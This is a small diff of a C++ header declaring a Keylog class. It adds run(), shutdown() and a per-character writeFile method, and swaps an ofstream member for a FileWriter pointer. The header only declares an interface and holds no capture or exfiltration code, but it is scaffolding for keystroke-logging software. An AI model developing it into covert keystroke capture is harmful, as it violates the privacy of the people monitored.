@@ -1,15 +1,20 @@
 #ifndef _KEYLOG_HH_
 #define _KEYLOG_HH_
 
+#include "fileWriter.hh"
+
 class Keylog
 {
 	public:
-		Keylog(std::string file);
+		Keylog(char* file);
 		~Keylog();
-		writeFile(std::string data);
+		void run();
+		void writeFile(char data);
+		void shutdown();
 
 	private:
-		ofstream file;
+		FileWriter* fileOutput;
+		bool writer;
 };
 
 #endif
